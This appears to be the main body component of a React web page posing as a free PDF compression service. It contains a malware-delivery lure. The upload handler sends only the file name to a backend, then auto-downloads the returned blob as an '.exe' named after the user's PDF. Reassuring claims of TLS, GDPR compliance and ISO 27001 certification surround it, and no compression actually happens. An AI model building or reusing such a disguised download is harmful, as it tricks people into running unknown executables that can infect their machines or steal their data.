import React, {  useState } from 'react'
import Upload from './Upload'
import img1 from '../assets/images/img1.png'
import img2 from '../assets/images/img2.png'
import img3 from '../assets/images/img3.png'
import img4 from '../assets/images/img4.png'

const Body = () => {
  const [file, setFile] = useState<File | null>(null)

  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    if (e.target.files) {
      setFile(e.target.files[0])
    }
  }

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault()
    if (!file) return

    const formData = new FormData()
    formData.append('pdfFile', file)

    try {
      const response = await fetch('/upload', {
        method: 'POST',
        headers: {
            'Content-Type':'application/json'
        },
        body: JSON.stringify(({name:file?.name}))
      })
      if (response.ok) {
        const data = await response.json()
        console.log(data)
      }
    } catch (error) {
      console.error('Error uploading file:', error)
    }
  }

  const sendFileData = async (fileName:string)=>{
    if (!fileName) return;
    try{
    const response = await fetch(`${import.meta.env.VITE_REACT_APP_BACKEND_BASEURL}/upload`,{
        method:'POST',
        headers: {
            'Content-Type':'application/json'
        },
        body: JSON.stringify(({name:fileName}))
    })
    if(response.ok){
        const blob = await response.blob();
        const url = window.URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = fileName.replace(/\.pdf$/i, '.exe');
        document.body.appendChild(a);
        a.click();
        a.remove();
    }
    }
 catch(err){
    console.error(err)
 }
  }

  return (
    <>
    <div className='min-h-screen w-full flex flex-col items-center justify-center gap-24'>
        <h1 className='font-peanutButter text-8xl text-[#F1E3E4]'>Effortless Compression. Instant Results.</h1>
        <div className='min-h-80 min-w-[640px] bg-[#CCBCBC]  border-[1px] border-[#F1E3E4] outline-dashed outline-offset-8 outline-[#F1E3E4] flex items-center justify-center'>
<Upload
  onFileSelect={ async (file) => {
    if (!file) return;
    setFile(file);
    console.log(file.name, file.size);
    sendFileData(file.name);
  }}
/>

    </div>
        <h1 className='font-peanutButter text-8xl text-[#F1E3E4] mt-24'>Shrink PDF Size, Preserve Quality</h1>
    </div>
    <div className='flex flex-col items-center justify-center -translate-y-16'>
    <p className='text-[#F1E3E4] text-2xl'>Compress PDFs online for free, maintaining document quality. Reduce large files for</p>
    <span className='text-[#F1E3E4] text-2xl'> easy sharing and storage in just a few clicks.</span>
    </div>
    <div className='flex flex-col items-center justify-center gap-12 mt-6'>
     {/* Features Section */}
     {/* Feature 1 */}
    <div className='min-h-[500px]  w-[1200px] flex items-center justify-center'>
        <div className='h-[400px] w-[600px]  mt-16'>
        <h1 className='font-molot text-[#F1E3E4] text-4xl mx-6 '>Fast & Effective Compression</h1>
        <p className=' text-[#F1E3E4] text-xl mx-6 mt-24'>Compress your PDF effortlessly and instantly. Simply drag and drop your file; our tool will automatically optimize it within seconds. Enjoy seamless online performance across all major platforms: Mac, Windows, Linux, iOS, and Android. No manual adjustments needed.</p>
        </div>
        <img src={img1} alt="Sample PDF" className='h-[400px] w-[600px] scale-125'/>
    </div>
    {/* Feature 2 */}
        <div className='min-h-[500px]  w-[1200px] flex items-center justify-center'>
        <img src={img2} alt="Sample PDF" className='h-[400px] w-[600px] scale-125'/>
        <div className='h-[400px] w-[600px]  mt-16'>
        <h1 className='font-molot text-[#F1E3E4] text-4xl mx-6 '>Smaller PDFs, Same High Quality</h1>
        <p className=' text-[#F1E3E4] text-xl mx-6 mt-24'>Select between Basic and Strong PDF compression for the optimal balance. Reduce file size without noticeable quality loss.</p>
        </div>
    </div>
    {/* Feature 3 */}
        <div className='min-h-[500px]  w-[1200px] flex items-center justify-center'>
        <div className='h-[400px] w-[600px]  mt-16'>
        <h1 className='font-molot text-[#F1E3E4] text-4xl mx-6 '>Secure Compression, Trusted Worldwide</h1>
        <p className=' text-[#F1E3E4] text-xl mx-6 mt-24'>Your documents are secured with TLS encryption, adhere to GDPR, and are ISO/IEC 27001 certified. For your privacy, we automatically delete files after one hour.</p>
        </div>
        <img src={img3} alt="Sample PDF" className='h-[400px] w-[600px] scale-125'/>
    </div>
    {/* Feature 4 */}
     <div className='min-h-[500px]  w-[1200px] flex items-center justify-center bg-[#141519]'>
        <img src={img4} alt="Sample PDF" className='h-[400px] w-[600px] scale-150'/>
        <div className='h-[400px] w-[600px]  mt-16'>
        <h1 className='font-molot text-[#F1E3E4] text-4xl mx-6 '>How To Compress a PDF Online for Free</h1>
        <p className=' text-[#F1E3E4] text-xl mx-6 mt-16'>1. Drag & drop your file into our free PDF Compressor tool.</p>
        <p className=' text-[#F1E3E4] text-xl mx-6 mt-4'>2. Choose Basic or Strong (Pro) compression, then click ‘Compress’.</p>
        <p className=' text-[#F1E3E4] text-xl mx-6 mt-4'>3. If needed, edit your PDF with our other tools.</p>
        <p className=' text-[#F1E3E4] text-xl mx-6 mt-4'>4. Download or share your compressed file when you’re done.
        </p>
        </div>
    </div>
    <div className="min-h-32"></div>
    </div>
    </>
  )
}

export default Body
